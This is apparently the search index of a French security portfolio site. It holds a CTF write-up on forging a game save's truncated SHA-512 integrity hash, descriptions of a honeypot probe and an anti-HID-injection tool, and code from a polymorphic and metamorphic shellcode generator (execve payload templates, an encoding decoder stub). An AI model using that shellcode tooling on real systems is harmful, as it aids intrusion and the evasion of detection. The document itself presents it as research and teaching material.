Nous identifions quatre candidats : Adler32 SHA512-224 SHA512-256 SHA384 SHA512 L'algorithme Adler32 ne produit que des sommes, exprim\u00e9es en un nombre poss\u00e9dant jusqu'\u00e0 10 chiffres ; nous l'\u00e9cartons donc pour nous concentrer sur le SHA-512. Info L'algorithme Adler32 est utilis\u00e9 par la compression gzip, ce qui justifie sa pr\u00e9sence dans le binaire. Puisqu'il existe 3 formats g\u00e9r\u00e9s par la lib crypto/sha512, nous nous contenterons... de tous les essayer. Ces fonctions correspondent aux algorithmes 512-224, 512-256, 384, et 512 de la commande shasum . Nous pouvons donc toutes les tester de la mani\u00e8re suivante : level0@359b243ce4cd:~$ echo -n \"alvoras:1;used,2;:Salle de saut:Porte:\" > ./raw level0@359b243ce4cd:~$ shasum -a 512224 ./raw; shasum -a 512256 ./raw; shasum -a 384 ./raw; shasum -a 512 ./raw 9a8632699d0e944ef4733d84468878561f2491414db301287f341eaa ./raw ca3e64ee4b2fd78d393c99952207bf09c6d95bc4759e3154a3d68cf301c9fd0b ./raw abe6d7fcbfc0bc8536b6b8b62a9f9596d6c8024bba450541ef58c9ad6595e84f8d367b08be84746a7fb5c67ec920965f ./raw 4937897b1ad44ed355e8324d3d9a67fe7ff80cfc16101c6aabe54dbb3059a36900e526c3a750b885cd22ae26412a81a075d77ed82036a3b3f38271772c497bf0 ./raw Nous avons un match avec la derni\u00e8re commande : il s'agit donc des 12 premiers caract\u00e8res d'un SHA512 du fichier de sauvegarde. Nous validons notre hypoth\u00e8se en reprenant la manipulation cit\u00e9e plus haut mais en modifiant cette fois-ci le hash : level0@359b243ce4cd:~$ echo -n \"alvoras:2;used,2;:Salle de saut:Porte:\" | sha512sum | head -c 12 && echo 88038a66346d level0@359b243ce4cd:~$ # On modifie l'ID de la clef et on remplace le hash tronqu\u00e9 level0@359b243ce4cd:~$ vim ./save.uncomp level0@359b243ce4cd:~$ zlib-flate -compress < ./save.uncomp > .save.ans Notre sauvegarde est valide et nous obtenons bien deux bo\u00eetes dans notre inventaire.","title":"Le check d'int\u00e9grit\u00e9"},{"location":"ctf/#la-generation-dobjets","text":"Maintenant que nous sommes en mesure de modifier la sauvegarde sans la corrompre, nous pouvons faire appara\u00eetre n'importe quel item dans notre inventaire. Nous ne connaissons pas l'ID de l'UVL540. Qu'\u00e0 cela ne tienne, nous g\u00e9n\u00e9rons les items poss\u00e9dant les IDs de 1 \u00e0 30. Pour simplifier les manipulations, nous cr\u00e9ons un petit script bash qui reprend les commandes au-dessus : save = \"alvoras:1;used,2;,3;,4;,5;,6;,7;,8;,9;,10;,11;,12;,13;,14;,15;,16;,17;,18;,19;,20;,21;,22;,23;,24;,25;,26;,27;,28;,29;,30;:Salle de saut:Porte:\" hash = $( echo -n \" $save \" | sha512sum | head -c 12 ) echo $save$hash echo -n $save$hash > tmp_save zlib-flate -compress < ./tmp_save > .save.ans ./dimensional ... et nous obtenons une sauvegarde corrompue. Nous v\u00e9rifions que le script fonctionne bien en ajoutant un unique objet : save = \"alvoras:1;used,2;,3;:Salle de saut:Porte:\" hash = $( echo -n \" $save \" | sha512sum | head -c 12 ) echo $save$hash echo -n $save$hash > tmp_save zlib-flate -compress < ./tmp_save > .save.ans ./dimensional Il fonctionne donc correctement ; le crash peut \u00eatre li\u00e9 soit \u00e0 une trop grande quantit\u00e9 d'objets dans l'inventaire, soit \u00e0 des identifiants invalides. Nous avan\u00e7ons plus prudemment en it\u00e9rant sur le 3\u00e8me champ, jusqu'\u00e0 arriver sur la sauvegarde suivante : alvoras:1;used,2;,4;:Salle de saut:Porte:7dc79aa29c6f Nous obtenons ainsi l'UVL540, qui poss\u00e8de l'identifiant \"4\".","title":"La g\u00e9n\u00e9ration d'objets"},{"location":"ctf/#la-console","text":"Une fois l'UVL540 obtenu, il faut aller charger le programme de saut depuis la console. Un mot de passe est n\u00e9cessaire, sans quoi la sauvegarde est d\u00e9truite. Encore une fois, nous utilisons strings pour fouiller dans le programme. Nous cherchons une cha\u00eene de caract\u00e8re que nous savons pr\u00e9sente (ici \"Si un jour tu lis ce message,\") pour nous rendre dans la section o\u00f9 sont contenues les variables du programme : Quelques lignes de dialogue que nous n'avons jamais vu attire notre attention : > Tu cherches des indices autour de toi. > Le vieux avait une mauvaise m moire, le mot de passe devrait tre not quelque part... > Bingo ! Sous le *clavier*. Si l'ANSSI voyait a... Dans la salle de saut, nous nous rendons devant le *clavier*... ... pour y trouver le mot de passe. Info Pour \u00e9viter que le mot de passe ne se retrouve en clair dans le binaire et forcer le joueur \u00e0 passer par le jeu, il est d\u00e9riv\u00e9 de mani\u00e8re dynamique \u00e0 partir du hash d'int\u00e9grit\u00e9 de la sauvegarde charg\u00e9e. Nous le rentrons dans la console : L'UVL540 est maintenant charg\u00e9.","title":"La console"},{"location":"ctf/#le-flag","text":"Nous pouvons d\u00e9sormais utiliser l'item pour se rendre dans le cyberespace et r\u00e9cup\u00e9rer le flag :","title":"Le flag"},{"location":"cti/","text":"CTI # Melody # Info Source : https://github.com/bonjourmalware/melody Inspiration : R\u00e8gles Sigma , viz.greynoise.io Langage : Golang Melody est une sonde de couche 2 permettant d'enregistrer et de tagger l'ensemble des paquets re\u00e7us via un syst\u00e8me de r\u00e8gles sur-mesure. Cet outil est pens\u00e9 pour \u00eatre dispers\u00e9 sur Internet afin d'en capter le \"bruit de fond\". Plusieurs cas d'usages existent : Poss\u00e9der un \"n\u00e9gatif\" du traffic n\u00e9gligeable pour r\u00e9duire le bruit lors d'une analyse d'activit\u00e9 r\u00e9seau Analyser les motifs r\u00e9current pour en extraire des tendances Suivre l'\u00e9volution de la menace lors de la correction d'une vuln\u00e9rabilit\u00e9 critique Surveiller l'\u00e9mergence d'une campagne d'exploitation sur une ou un ensemble de technologies donn\u00e9es Rejouer une capture r\u00e9seau pour en extraire des paquets sp\u00e9cifiques gr\u00e2ce \u00e0 des r\u00e8gles d\u00e9di\u00e9es Un serveur HTTP/S int\u00e9gr\u00e9 offre la possibilit\u00e9 d'\u00e9muler une application web vuln\u00e9rable en pla\u00e7ant simplement les fichiers \u00e0 afficher aux chemins ad\u00e9quats. Cela peut s'av\u00e9rer utile, par exemple, si l'on souhaite observer le comportement des scanners en fonction des applications expos\u00e9es. Pour plus de d\u00e9tails, une documentation est disponible sur https://bonjourmalware.github.io/melody/ . Aper\u00e7u # Aper\u00e7u du flux de paquets re\u00e7us par une sonde Melody Exemple de dashboard qu'il est possible de r\u00e9aliser \u00e0 partir des donn\u00e9es r\u00e9colt\u00e9es Meloctl # Info Source : https://github.com/bonjourmalware/melody Langage : Golang Meloctl est un programme destin\u00e9 \u00e0 faciliter l'utilisation de Melody en prenant en charge les op\u00e9rations suivantes : Installation et mise \u00e0 jour de la sonde Int\u00e9gration \u00e0 systemd Int\u00e9gration \u00e0 supervisor Validation du fichier de configuration Cr\u00e9ation de r\u00e8gles depuis la CLI ou de mani\u00e8re interactive Validation des r\u00e8gles fichier par fichier ou par dossier complet Mise \u00e0 jour du ruleset Aper\u00e7u # Aper\u00e7u de la validation des r\u00e8gles Your browser does not support the video tag. Cr\u00e9ation d'un template de r\u00e8gle lab.bonjourmalwa.re # Info Inspiration : viz.greynoise.io Langage : Golang, VueJS Cette interface est disponible publiquement et propose un jeu de donn\u00e9es issu des 30 derniers jours de r\u00e9colte d'une sonde Melody. Elle a \u00e9t\u00e9 cr\u00e9\u00e9e afin d'offrir une interface d'analyse compl\u00e9mentaire \u00e0 Kibana, compl\u00e8tement rigide mais plus rapide et qui permet de pivoter sur l'ensemble des param\u00e8tres r\u00e9colt\u00e9s. De plus, elle me permet d'\u00eatre en mesure de monter des pages synth\u00e9tisant des informations regroup\u00e9es d'une mani\u00e8re qu'il est difficile de reproduire via un moteur de visualisation comme Kibana. Aper\u00e7u # Your browser does not support the video tag.","title":"Threat intelligence"},{"location":"cti/#cti","text":"","title":"CTI"},{"location":"cti/#melody","text":"Info Source : https://github.com/bonjourmalware/melody Inspiration : R\u00e8gles Sigma , viz.greynoise.io Langage : Golang Melody est une sonde de couche 2 permettant d'enregistrer et de tagger l'ensemble des paquets re\u00e7us via un syst\u00e8me de r\u00e8gles sur-mesure. Cet outil est pens\u00e9 pour \u00eatre dispers\u00e9 sur Internet afin d'en capter le \"bruit de fond\". Plusieurs cas d'usages existent : Poss\u00e9der un \"n\u00e9gatif\" du traffic n\u00e9gligeable pour r\u00e9duire le bruit lors d'une analyse d'activit\u00e9 r\u00e9seau Analyser les motifs r\u00e9current pour en extraire des tendances Suivre l'\u00e9volution de la menace lors de la correction d'une vuln\u00e9rabilit\u00e9 critique Surveiller l'\u00e9mergence d'une campagne d'exploitation sur une ou un ensemble de technologies donn\u00e9es Rejouer une capture r\u00e9seau pour en extraire des paquets sp\u00e9cifiques gr\u00e2ce \u00e0 des r\u00e8gles d\u00e9di\u00e9es Un serveur HTTP/S int\u00e9gr\u00e9 offre la possibilit\u00e9 d'\u00e9muler une application web vuln\u00e9rable en pla\u00e7ant simplement les fichiers \u00e0 afficher aux chemins ad\u00e9quats. Cela peut s'av\u00e9rer utile, par exemple, si l'on souhaite observer le comportement des scanners en fonction des applications expos\u00e9es. Pour plus de d\u00e9tails, une documentation est disponible sur https://bonjourmalware.github.io/melody/ .","title":"Melody"},{"location":"cti/#apercu","text":"Aper\u00e7u du flux de paquets re\u00e7us par une sonde Melody Exemple de dashboard qu'il est possible de r\u00e9aliser \u00e0 partir des donn\u00e9es r\u00e9colt\u00e9es","title":"Aper\u00e7u"},{"location":"cti/#meloctl","text":"Info Source : https://github.com/bonjourmalware/melody Langage : Golang Meloctl est un programme destin\u00e9 \u00e0 faciliter l'utilisation de Melody en prenant en charge les op\u00e9rations suivantes : Installation et mise \u00e0 jour de la sonde Int\u00e9gration \u00e0 systemd Int\u00e9gration \u00e0 supervisor Validation du fichier de configuration Cr\u00e9ation de r\u00e8gles depuis la CLI ou de mani\u00e8re interactive Validation des r\u00e8gles fichier par fichier ou par dossier complet Mise \u00e0 jour du ruleset","title":"Meloctl"},{"location":"cti/#apercu_1","text":"Aper\u00e7u de la validation des r\u00e8gles Your browser does not support the video tag. Cr\u00e9ation d'un template de r\u00e8gle","title":"Aper\u00e7u"},{"location":"cti/#labbonjourmalware","text":"Info Inspiration : viz.greynoise.io Langage : Golang, VueJS Cette interface est disponible publiquement et propose un jeu de donn\u00e9es issu des 30 derniers jours de r\u00e9colte d'une sonde Melody. Elle a \u00e9t\u00e9 cr\u00e9\u00e9e afin d'offrir une interface d'analyse compl\u00e9mentaire \u00e0 Kibana, compl\u00e8tement rigide mais plus rapide et qui permet de pivoter sur l'ensemble des param\u00e8tres r\u00e9colt\u00e9s. De plus, elle me permet d'\u00eatre en mesure de monter des pages synth\u00e9tisant des informations regroup\u00e9es d'une mani\u00e8re qu'il est difficile de reproduire via un moteur de visualisation comme Kibana.","title":"lab.bonjourmalwa.re"},{"location":"cti/#apercu_2","text":"Your browser does not support the video tag.","title":"Aper\u00e7u"},{"location":"defsec/","text":"S\u00e9curit\u00e9 d\u00e9fensive # NoMoreDuck # Info Source : https://gitlab.com/Alvoras/nomoreduck Inspiration : https://github.com/pmsosa/duckhunt Langage : Golang Description # NoMoreDuck (dont le nom est inspir\u00e9 de l'admirable projet NoMoreRansom ) propose une contre-mesure aux injections de commande par l'interm\u00e9diaire d'un \u00e9mulateur HID comme le RubberDucky. Fonctionnement # L'outil va calculer le d\u00e9lai moyen entre chaque frappe et d\u00e9clencher l'une des actions suivantes lorsque le seuil configur\u00e9 est d\u00e9pass\u00e9 : Paranoid La session est verouill\u00e9e Normal L'envoi de nouvelles frappes est bloqu\u00e9 pendant X secondes Sneaky Une touche sur N est bloqu\u00e9e Log Invisible pour l'attaquant Un fichier est cr\u00e9\u00e9 contenant toutes les frappes de clavier jusqu'\u00e0 la lev\u00e9e de l'alerte La fr\u00e9quence et la dur\u00e9e de ces contre-mesures sont param\u00e9trables via le fichier de configuration. Aper\u00e7u # Your browser does not support the video tag.","title":"S\u00e9curit\u00e9 d\u00e9fensive"},{"location":"defsec/#securite-defensive","text":"","title":"S\u00e9curit\u00e9 d\u00e9fensive"},{"location":"defsec/#nomoreduck","text":"Info Source : https://gitlab.com/Alvoras/nomoreduck Inspiration : https://github.com/pmsosa/duckhunt Langage : Golang","title":"NoMoreDuck"},{"location":"defsec/#description","text":"NoMoreDuck (dont le nom est inspir\u00e9 de l'admirable projet NoMoreRansom ) propose une contre-mesure aux injections de commande par l'interm\u00e9diaire d'un \u00e9mulateur HID comme le RubberDucky.","title":"Description"},{"location":"defsec/#fonctionnement","text":"L'outil va calculer le d\u00e9lai moyen entre chaque frappe et d\u00e9clencher l'une des actions suivantes lorsque le seuil configur\u00e9 est d\u00e9pass\u00e9 : Paranoid La session est verouill\u00e9e Normal L'envoi de nouvelles frappes est bloqu\u00e9 pendant X secondes Sneaky Une touche sur N est bloqu\u00e9e Log Invisible pour l'attaquant Un fichier est cr\u00e9\u00e9 contenant toutes les frappes de clavier jusqu'\u00e0 la lev\u00e9e de l'alerte La fr\u00e9quence et la dur\u00e9e de ces contre-mesures sont param\u00e9trables via le fichier de configuration.","title":"Fonctionnement"},{"location":"defsec/#apercu","text":"Your browser does not support the video tag.","title":"Aper\u00e7u"},{"location":"offsec/","text":"S\u00e9curit\u00e9 offensive # OrgASM # Info Source : https://gitlab.com/Alvoras/orgasm Langage : Python, C, NASM Description # OrgASM est un outil en ligne de commande interactif qui permet de g\u00e9n\u00e9rer des shellcodes poly- et metamorphique. Il propose \u00e9galement une gamme d'outils facilitant le d\u00e9veloppement, le test et le d\u00e9bug de shellcode. Note Le plugin de payload supporte \u00e0 la fois le code source NASM et les shellcode sous leurs formes hexad\u00e9cimale. En revanche, le moteur en charge du m\u00e9tamorphisme ne supporte que la premi\u00e8re forme. Aper\u00e7u # Your browser does not support the video tag. Fonctionnement # La fondation du fonctionnement de cet outil est le d\u00e9coupage de ce qui constitue un shellcode en briques qu'il est possible manipuler et de combiner de mani\u00e8re ind\u00e9pendante. Nous retrouvons ainsi un syst\u00e8me de plugin diff\u00e9rent pour : Le payload La donn\u00e9es \u00e0 ins\u00e9rer dynamiquement Le polymorphisme Le metamorphisme Payload # La cr\u00e9ation d'un plugin de payload se r\u00e9sume \u00e0 renseigner un template pour chaque architecture puis enregistrer les patchers et les modules de m\u00e9tamorphismes utilis\u00e9s. from modules.payload.base import BasePayload from modules.patcher.ascii_data import AsciiData from modules.patcher.ascii_len import AsciiLen from modules.meta.metaengine import MetaEngine from modules.meta.junk import Junk from modules.meta.zero import Zero class ExecvePayload ( BasePayload ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Execve\" # Add the patcher's options to the payload # Here the AsciiData adds the \"data\" option self . options . add_patcher_options ( AsciiData ) self . add_patcher ( AsciiData ) def payload_32 ( self ): # Register the metmorphic plugins used meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: ; Pick a random alterations and patch it on the fly { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } push eax ; Insert the placeholder that will be replaced by the value of the \"data\" option { AsciiData . token } ; Add some random junk { meta . apply ( 'junk' , 32 ) } mov ebx,esp mov ecx,eax mov edx,eax mov al, 0x0b mov ebx, esp int 0x80 { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } inc eax int 0x80 \"\"\" # The same goes for the x64 template def payload_64 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: { meta . apply ( 'zero' , 64 , reg1 = 'eax' ) } push 0x42 pop rax inc ah cqo push rdx { AsciiData . token } { meta . apply ( 'junk' , 64 ) } push rsp pop rsi mov r8, rdx mov r10, rdx syscall \"\"\" Donn\u00e9es dynamiques # Les donn\u00e9es \u00e0 int\u00e9grer au shellcode de mani\u00e8re dynamique sont g\u00e9r\u00e9es par les patchers . Leur fonctionnement est simple : leur seul r\u00f4le est renvoyer la donn\u00e9e par laquelle remplacer le placeholder pr\u00e9sent dans le template. from modules.patcher.base import BasePatcher class AsciiLen ( BasePatcher ): # Template placeholder token = \"$ASCII_LEN$\" # \"patch_shellcode\" is set upstream to signal # that we're patching either raw shellcode or NASM source code def __init__ ( self , sc , patch_shellcode ): super () . __init__ ( sc , patch_shellcode ) def apply ( self , options , encoded_payload ): data = format ( len ( options . get ( \"data\" )), \"02x\" ) # ex : 1a # We need to add an \"h\" to the end of the hex string if we're # patching a source code template # ie. 08h return self . patch_with ( data ) if self . patch_shellcode else self . patch_with ( f \" { data } h\" ) Polymorphisme # Le polymorphisme est pris en charge par les encoders . Analogues aux payloads, il est \u00e9galement possible d'int\u00e9grer des instructions m\u00e9tamorphiques au sein du template. Apr\u00e8s avoir \u00e9t\u00e9 encod\u00e9 via la fonction encode_byte , le payload est plac\u00e9 \u00e0 la suite du d\u00e9codeur. from modules.encoder.base import BaseEncoder from modules.meta.metaengine import MetaEngine from modules.meta.zero import Zero from modules.meta.junk import Junk from modules.patcher.shellcode_len import ShellcodeLen from modules.patcher.offset import Offset class CaesarMetaEncoder ( BaseEncoder ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Caesar metamorphic\" self . options . add_patcher_options ( Offset ) self . add_patcher ( Offset ) self . add_patcher ( ShellcodeLen ) def decoder_32 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return rf \"\"\" section .text global _start: _start: jmp one { meta . apply ( 'junk' , 32 ) } four: pop esi { meta . apply ( 'zero' , 32 , reg1 = 'ecx' ) } mov cl, { ShellcodeLen . token } two: sub BYTE [esi+ecx-1], { Offset . token } sub cl,1 jne two jmp three one: call four three: \"\"\" def decoder_64 ( self ): return rf \"\"\" section .text global _start: _start: jmp one four: pop rsi xor rcx, rcx mov cl, { ShellcodeLen . token } two: sub BYTE [rsi+rcx-1], { Offset . token } sub cl,0x1 jne two jmp three one: call four three: \"\"\" def encode_byte ( self , op ): encoded = format ( op + self . options . get ( \"offset\" ) % 26 , \"02x\" ) encoded_hex = int ( encoded [ - 2 :], 16 ) return encoded_hex def decode_byte ( self , op ): decoded = format ( op - self . options . get ( \"offset\" ) % 26 , \"02x\" ) decoded_hex = int ( decoded [ - 2 :], 16 ) return decoded_hex Les fonctions d'encodage et de d\u00e9codage peuvent \u00e9galement \u00eatre utilis\u00e9es depuis l'interface sur un shellcode brute : Your browser does not support the video tag. Metamorphisme # Les plugins servant \u00e0 impl\u00e9menter le metamorphisme se r\u00e9sument \u00e0 un nom et aux templates des alt\u00e9rations possibles : from modules.meta.base import BasePlugin class Zero ( BasePlugin ): def __init__ ( self ): super () . __init__ () self . name = \"zero\" self . alterations = { \"32\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ], \"64\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ] } Le moteur de m\u00e9tamorphisme, quant \u00e0 lui, se contente de tenir la liste des plugins enregistr\u00e9s et de les appeler en passant les valeurs depuis le template : import re import random from lib.exception import MarkerNotFound class MetaEngine : def __init__ ( self ): self . name = \"base\" self . alterations = {} self . plugins = {} def add ( self , plugin ): eng = plugin () self . plugins [ eng . name ] = eng def apply ( self , name , arch , ** kwargs ): if not ( plugin := self . plugins . get ( name )): print ( f \"Metamorphic plugin not found \\\" { name } \\\" \" ) return \"\" return plugin . get_random_alt ( arch , reg1 = kwargs . get ( \"reg1\" ), reg2 = kwargs . get ( \"reg2\" ), val1 = kwargs . get ( \"val1\" ), val2 = kwargs . get ( \"val2\" ), val3 = kwargs . get ( \"val3\" ), val4 = kwargs . get ( \"val4\" ) ) La fonction get_random_alt du plugin prend ensuite le relais et s'occupe de g\u00e9n\u00e9rer la ou les instructions \u00e0 partir du template re\u00e7u : import random from lib.exception import UnsupportedArch class BasePlugin : def __init__ ( self ): self . alterations = {} def get_random_alt ( self , arch , reg1 = \"\" , reg2 = \"\" , val1 = \"\" , val2 = \"\" , val3 = \"\" , val4 = \"\" ): alterations = self . alterations . get ( str ( arch )) if not alterations : raise UnsupportedArch rng = random . randint ( 0 , len ( alterations ) - 1 ) alt = alterations [ rng ] for idx , line in enumerate ( alt ): line = line . replace ( \"<reg1>\" , str ( reg1 )) line = line . replace ( \"<reg2>\" , str ( reg2 )) line = line . replace ( \"<val1>\" , str ( val1 )) line = line . replace ( \"<val2>\" , str ( val2 )) line = line . replace ( \"<val2>\" , str ( val3 )) line = line . replace ( \"<val2>\" , str ( val4 )) alt [ idx ] = line return \" \\n \" . join ( alt ) Ces alt\u00e9rations sont choisies al\u00e9atoirement \u00e0 chaque fois que le shellcode est g\u00e9n\u00e9r\u00e9. Il est possible, gr\u00e2ce \u00e0 l'option no_badchars , de recommencer la g\u00e9n\u00e9ration jusqu'\u00e0 ne plus d\u00e9tect\u00e9 de de badchars pr\u00e9sent (dans la limite de la valeur d\u00e9finie via l'option badchars_max_loop ). Confort # Pour am\u00e9liorer le confort lors de la cr\u00e9ation, de l'utilisation et du test de shellcode, OrgASM propose une vue d\u00e9taill\u00e9e reprenant un certain nombre d'informations pouvant s'av\u00e9rer \u00eatre utiles, telles que : La taille du shellcode Les badchars potentiellement pr\u00e9sents La liste class\u00e9e par ordre alphab\u00e9tique des octets qui le composent, sans doublons Les hashs MD5, SHA1 et SHA256 Lorsque l'option verbose est activ\u00e9e, le programme d\u00e9taille les processus de compilation et d'ex\u00e9cution pour permettre de les reproduire dans un autre contexte.","title":"S\u00e9curit\u00e9 offensive"},{"location":"offsec/#securite-offensive","text":"","title":"S\u00e9curit\u00e9 offensive"},{"location":"offsec/#orgasm","text":"Info Source : https://gitlab.com/Alvoras/orgasm Langage : Python, C, NASM","title":"OrgASM"},{"location":"offsec/#description","text":"OrgASM est un outil en ligne de commande interactif qui permet de g\u00e9n\u00e9rer des shellcodes poly- et metamorphique. Il propose \u00e9galement une gamme d'outils facilitant le d\u00e9veloppement, le test et le d\u00e9bug de shellcode. Note Le plugin de payload supporte \u00e0 la fois le code source NASM et les shellcode sous leurs formes hexad\u00e9cimale. En revanche, le moteur en charge du m\u00e9tamorphisme ne supporte que la premi\u00e8re forme.","title":"Description"},{"location":"offsec/#apercu","text":"Your browser does not support the video tag.","title":"Aper\u00e7u"},{"location":"offsec/#fonctionnement","text":"La fondation du fonctionnement de cet outil est le d\u00e9coupage de ce qui constitue un shellcode en briques qu'il est possible manipuler et de combiner de mani\u00e8re ind\u00e9pendante. Nous retrouvons ainsi un syst\u00e8me de plugin diff\u00e9rent pour : Le payload La donn\u00e9es \u00e0 ins\u00e9rer dynamiquement Le polymorphisme Le metamorphisme","title":"Fonctionnement"},{"location":"offsec/#payload","text":"La cr\u00e9ation d'un plugin de payload se r\u00e9sume \u00e0 renseigner un template pour chaque architecture puis enregistrer les patchers et les modules de m\u00e9tamorphismes utilis\u00e9s. from modules.payload.base import BasePayload from modules.patcher.ascii_data import AsciiData from modules.patcher.ascii_len import AsciiLen from modules.meta.metaengine import MetaEngine from modules.meta.junk import Junk from modules.meta.zero import Zero class ExecvePayload ( BasePayload ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Execve\" # Add the patcher's options to the payload # Here the AsciiData adds the \"data\" option self . options . add_patcher_options ( AsciiData ) self . add_patcher ( AsciiData ) def payload_32 ( self ): # Register the metmorphic plugins used meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: ; Pick a random alterations and patch it on the fly { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } push eax ; Insert the placeholder that will be replaced by the value of the \"data\" option { AsciiData . token } ; Add some random junk { meta . apply ( 'junk' , 32 ) } mov ebx,esp mov ecx,eax mov edx,eax mov al, 0x0b mov ebx, esp int 0x80 { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } inc eax int 0x80 \"\"\" # The same goes for the x64 template def payload_64 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: { meta . apply ( 'zero' , 64 , reg1 = 'eax' ) } push 0x42 pop rax inc ah cqo push rdx { AsciiData . token } { meta . apply ( 'junk' , 64 ) } push rsp pop rsi mov r8, rdx mov r10, rdx syscall \"\"\"","title":"Payload"},{"location":"offsec/#donnees-dynamiques","text":"Les donn\u00e9es \u00e0 int\u00e9grer au shellcode de mani\u00e8re dynamique sont g\u00e9r\u00e9es par les patchers . Leur fonctionnement est simple : leur seul r\u00f4le est renvoyer la donn\u00e9e par laquelle remplacer le placeholder pr\u00e9sent dans le template. from modules.patcher.base import BasePatcher class AsciiLen ( BasePatcher ): # Template placeholder token = \"$ASCII_LEN$\" # \"patch_shellcode\" is set upstream to signal # that we're patching either raw shellcode or NASM source code def __init__ ( self , sc , patch_shellcode ): super () . __init__ ( sc , patch_shellcode ) def apply ( self , options , encoded_payload ): data = format ( len ( options . get ( \"data\" )), \"02x\" ) # ex : 1a # We need to add an \"h\" to the end of the hex string if we're # patching a source code template # ie. 08h return self . patch_with ( data ) if self . patch_shellcode else self . patch_with ( f \" { data } h\" )","title":"Donn\u00e9es dynamiques"},{"location":"offsec/#polymorphisme","text":"Le polymorphisme est pris en charge par les encoders . Analogues aux payloads, il est \u00e9galement possible d'int\u00e9grer des instructions m\u00e9tamorphiques au sein du template. Apr\u00e8s avoir \u00e9t\u00e9 encod\u00e9 via la fonction encode_byte , le payload est plac\u00e9 \u00e0 la suite du d\u00e9codeur. from modules.encoder.base import BaseEncoder from modules.meta.metaengine import MetaEngine from modules.meta.zero import Zero from modules.meta.junk import Junk from modules.patcher.shellcode_len import ShellcodeLen from modules.patcher.offset import Offset class CaesarMetaEncoder ( BaseEncoder ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Caesar metamorphic\" self . options . add_patcher_options ( Offset ) self . add_patcher ( Offset ) self . add_patcher ( ShellcodeLen ) def decoder_32 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return rf \"\"\" section .text global _start: _start: jmp one { meta . apply ( 'junk' , 32 ) } four: pop esi { meta . apply ( 'zero' , 32 , reg1 = 'ecx' ) } mov cl, { ShellcodeLen . token } two: sub BYTE [esi+ecx-1], { Offset . token } sub cl,1 jne two jmp three one: call four three: \"\"\" def decoder_64 ( self ): return rf \"\"\" section .text global _start: _start: jmp one four: pop rsi xor rcx, rcx mov cl, { ShellcodeLen . token } two: sub BYTE [rsi+rcx-1], { Offset . token } sub cl,0x1 jne two jmp three one: call four three: \"\"\" def encode_byte ( self , op ): encoded = format ( op + self . options . get ( \"offset\" ) % 26 , \"02x\" ) encoded_hex = int ( encoded [ - 2 :], 16 ) return encoded_hex def decode_byte ( self , op ): decoded = format ( op - self . options . get ( \"offset\" ) % 26 , \"02x\" ) decoded_hex = int ( decoded [ - 2 :], 16 ) return decoded_hex Les fonctions d'encodage et de d\u00e9codage peuvent \u00e9galement \u00eatre utilis\u00e9es depuis l'interface sur un shellcode brute : Your browser does not support the video tag.","title":"Polymorphisme"},{"location":"offsec/#metamorphisme","text":"Les plugins servant \u00e0 impl\u00e9menter le metamorphisme se r\u00e9sument \u00e0 un nom et aux templates des alt\u00e9rations possibles : from modules.meta.base import BasePlugin class Zero ( BasePlugin ): def __init__ ( self ): super () . __init__ () self . name = \"zero\" self . alterations = { \"32\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ], \"64\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ] } Le moteur de m\u00e9tamorphisme, quant \u00e0 lui, se contente de tenir la liste des plugins enregistr\u00e9s et de les appeler en passant les valeurs depuis le template : import re import random from lib.exception import MarkerNotFound class MetaEngine : def __init__ ( self ): self . name = \"base\" self . alterations = {} self . plugins = {} def add ( self , plugin ): eng = plugin () self . plugins [ eng . name ] = eng def apply ( self , name , arch , ** kwargs ): if not ( plugin := self . plugins . get ( name )): print ( f \"Metamorphic plugin not found \\\" { name } \\\" \" ) return \"\" return plugin . get_random_alt ( arch , reg1 = kwargs . get ( \"reg1\" ), reg2 = kwargs . get ( \"reg2\" ), val1 = kwargs . get ( \"val1\" ), val2 = kwargs . get ( \"val2\" ), val3 = kwargs . get ( \"val3\" ), val4 = kwargs . get ( \"val4\" ) ) La fonction get_random_alt du plugin prend ensuite le relais et s'occupe de g\u00e9n\u00e9rer la ou les instructions \u00e0 partir du template re\u00e7u : import random from lib.exception import UnsupportedArch class BasePlugin : def __init__ ( self ): self . alterations = {} def get_random_alt ( self , arch , reg1 = \"\" , reg2 = \"\" , val1 = \"\" , val2 = \"\" , val3 = \"\" , val4 = \"\" ): alterations = self . alterations . get ( str ( arch )) if not alterations : raise UnsupportedArch rng = random . randint ( 0 , len ( alterations ) - 1 ) alt = alterations [ rng ] for idx , line in enumerate ( alt ): line = line . replace ( \"<reg1>\" , str ( reg1 )) line = line . replace ( \"<reg2>\" , str ( reg2 )) line = line . replace ( \"<val1>\" , str ( val1 )) line = line . replace ( \"<val2>\" , str ( val2 )) line = line . replace ( \"<val2>\" , str ( val3 )) line = line . replace ( \"<val2>\" , str ( val4 )) alt [ idx ] = line return \" \\n \" . join ( alt ) Ces alt\u00e9rations sont choisies al\u00e9atoirement \u00e0 chaque fois que le shellcode est g\u00e9n\u00e9r\u00e9. Il est possible, gr\u00e2ce \u00e0 l'option no_badchars , de recommencer la g\u00e9n\u00e9ration jusqu'\u00e0 ne plus d\u00e9tect\u00e9 de de badchars pr\u00e9sent (dans la limite de la valeur d\u00e9finie via l'option badchars_max_loop ).","title":"Metamorphisme"},{"location":"offsec/#confort","text":"Pour 